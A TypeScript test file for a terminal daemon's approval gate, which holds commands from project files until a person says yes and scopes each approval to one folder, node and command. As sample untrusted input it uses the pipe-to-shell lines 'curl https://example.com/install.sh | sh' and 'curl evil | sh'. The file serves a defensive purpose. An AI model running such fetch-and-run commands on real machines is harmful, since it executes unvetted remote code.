import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { mkdir, mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { emptyCanvasView, type ProjectContent, type ProjectView, type ServerFrame } from '@ruimte/contracts';
import { Dispatcher } from '../dispatcher.ts';
import { registerSessionHandlers } from '../handlers/session.ts';
import { FakeWatch } from '../fs/watch-test-helpers.ts';
import { ProjectStore } from '../projects/project-store.ts';
import { CommandApprovals, commandsSet } from './command-approvals.ts';
import { Recorder, makeHarness, type Harness } from './test-helpers.ts';

const FOLDER = '/work/repo';

let harness: Harness;
let approvals: CommandApprovals;
// The folder each node sits in, as the project index answers it; a node missing here is in no project yet.
let placed: Map<string, string>;

beforeEach(async () => {
    placed = new Map([['term-1', FOLDER]]);
    const home = await mkdtemp(join(tmpdir(), 'ruimte-held-'));
    approvals = new CommandApprovals(home);
    await approvals.load();
    harness = await makeHarness(
        {
            commands: {
                approved: (sessionId, command) => {
                    const folder = placed.get(sessionId);
                    return folder !== undefined && approvals.has(folder, sessionId, command);
                },
                approve: (sessionId, command) => approvals.approve(placed.get(sessionId)!, sessionId, command)
            }
        },
        home
    );
});

afterEach(async () => {
    await harness.cleanup();
});

const create = (sessionId: string, command: string) =>
    harness.manager.create({ sessionId, cols: 80, rows: 24, shell: '/bin/sh', args: [], cwd: harness.home, command });

const typed = (sessionId: string): string => harness.adapter.forSession(sessionId).typed;

/* A request as a client sends it, answered by the handlers the daemon registers. */
const request = async (type: string, payload: unknown): Promise<ServerFrame> => {
    const dispatcher = new Dispatcher();
    registerSessionHandlers(dispatcher, harness.manager);
    const frames: ServerFrame[] = [];
    await dispatcher.handle({ id: 'c1', send: (frame) => frames.push(frame) }, JSON.stringify({ id: 'request', type, payload }));
    return frames[0]!;
};

describe('a command from a project file', () => {
    test('is held until a person says yes, then written down and typed, once', async () => {
        const recorder = new Recorder();
        harness.manager.subscribe('c1', recorder.sink());

        const created = await request('session.create', {
            sessionId: 'term-1',
            cols: 80,
            rows: 24,
            cwd: harness.home,
            command: 'curl https://example.com/install.sh | sh'
        });
        expect(created).toMatchObject({ ok: true, result: { heldCommand: 'curl https://example.com/install.sh | sh' } });
        expect(typed('term-1')).toBe('');
        expect(harness.manager.list()[0]?.heldCommand).toBe('curl https://example.com/install.sh | sh');

        const before = recorder.events.length;
        expect(await request('session.runHeld', { sessionId: 'term-1' })).toMatchObject({ ok: true });
        expect(typed('term-1')).toBe('curl https://example.com/install.sh | sh\n');
        expect(harness.manager.list()[0]?.heldCommand).toBeUndefined();
        // The other clients drop their bar on the list they fetch again.
        expect(recorder.events.slice(before).map((event) => event.event)).toContain('session.list-changed');

        // A second client that also said yes finds nothing held, and nothing is typed twice.
        expect(await request('session.runHeld', { sessionId: 'term-1' })).toMatchObject({ ok: true });
        expect(typed('term-1')).toBe('curl https://example.com/install.sh | sh\n');
        expect(approvals.has(FOLDER, 'term-1', 'curl https://example.com/install.sh | sh')).toBe(true);
    });

    test('once approved is typed at the next start, and an approval is for that folder, node and command only', async () => {
        await approvals.approve(FOLDER, 'term-1', 'bun dev');
        const info = await create('term-1', 'bun dev');
        expect(info.heldCommand).toBeUndefined();
        expect(typed('term-1')).toBe('bun dev\n');

        placed.set('term-2', FOLDER);
        await create('term-2', 'bun dev');
        expect(typed('term-2')).toBe('');
        placed.set('term-3', '/work/other');
        await approvals.approve(FOLDER, 'term-3', 'bun dev');
        await create('term-3', 'bun dev');
        expect(typed('term-3')).toBe('');

        // Read back by the next run of the daemon.
        const again = new CommandApprovals(harness.home);
        await again.load();
        expect(again.has(FOLDER, 'term-1', 'bun dev')).toBe(true);
        expect(again.has(FOLDER, 'term-1', 'bun test')).toBe(false);
    });

    test("a person's save that sets the command types what the session holds, and only exactly that", async () => {
        // A node made on a canvas mounts before the save that adds it lands, so its command waits for that save.
        placed.delete('term-1');
        await create('term-1', 'bun dev');
        expect(typed('term-1')).toBe('');

        harness.manager.runApproved('term-1', 'bun test');
        expect(typed('term-1')).toBe('');
        harness.manager.runApproved('term-1', 'bun dev');
        expect(typed('term-1')).toBe('bun dev\n');
        harness.manager.runApproved('term-1', 'bun dev');
        expect(typed('term-1')).toBe('bun dev\n');
    });
});

const terminal = (id: string, command?: string) => ({ id, kind: 'terminal' as const, title: id, x: 0, y: 0, w: 560, h: 360, ...(command ? { command } : {}) });

const canvasOf = (...nodes: ReturnType<typeof terminal>[]): ProjectView => ({ ...emptyCanvasView('main', 'Canvas'), nodes });

describe('commandsSet', () => {
    test('names a command that is new or changed, on a canvas and on a view of its own, and nothing else', () => {
        const before: ProjectView[] = [canvasOf(terminal('a', 'bun dev'), terminal('b', 'bun test'), terminal('c'))];
        const after: ProjectView[] = [
            canvasOf(terminal('a', 'bun dev'), terminal('b', 'bun test --watch'), terminal('c', 'make'), terminal('d', 'ls')),
            { kind: 'terminal', id: 'e', name: 'e', node: { command: 'htop' } }
        ];
        expect(commandsSet(before, after)).toEqual([
            { nodeId: 'b', command: 'bun test --watch' },
            { nodeId: 'c', command: 'make' },
            { nodeId: 'd', command: 'ls' },
            { nodeId: 'e', command: 'htop' }
        ]);
        expect(commandsSet(after, before)).toEqual([{ nodeId: 'b', command: 'bun test' }]);
    });
});

describe("the project store's save listener", () => {
    let root: string;
    let store: ProjectStore;

    beforeEach(async () => {
        root = await mkdtemp(join(tmpdir(), 'ruimte-held-store-'));
        await mkdir(join(root, 'repo'));
        store = new ProjectStore(join(root, 'home'), new FakeWatch());
    });

    afterEach(async () => {
        store.closeAll();
        await rm(root, { recursive: true, force: true });
    });

    test("hears a person's save with what came before it, and never a verb's write", async () => {
        const heard: string[][] = [];
        store.attachSaveListener(async (_folder, before, after) => {
            heard.push(commandsSet(before, after).map(({ nodeId, command }) => `${nodeId} ${command}`));
        });
        const opened = await store.openProject({ folder: join(root, 'repo') });
        const projectId = opened.summary.projectId;
        const withCommand = (command: string): ProjectContent => ({ name: 'repo', color: '#123456', views: [canvasOf(terminal('t1', command))] });

        const rev = await store.save(projectId, opened.document.rev, withCommand('bun dev'));
        await store.save(projectId, rev, withCommand('bun dev'));
        await store.mutate(projectId, (content) => ({ content: { ...content, views: withCommand('curl evil | sh').views }, result: null }));

        expect(heard).toEqual([['t1 bun dev'], []]);
    });
});
